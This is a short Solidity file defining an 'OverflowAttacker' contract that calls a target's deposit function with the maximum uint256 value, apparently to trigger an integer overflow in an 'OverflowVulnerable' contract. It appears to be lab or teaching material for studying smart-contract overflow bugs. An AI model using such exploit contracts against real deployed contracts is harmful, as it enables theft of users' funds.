contract OverflowAttacker {
    OverflowVulnerable public target;

    constructor(address _target) {
        target = OverflowVulnerable(_target);
    }

    function attack() public {
        uint256 max = type(uint256).max;
        target.deposit(max);
    }
}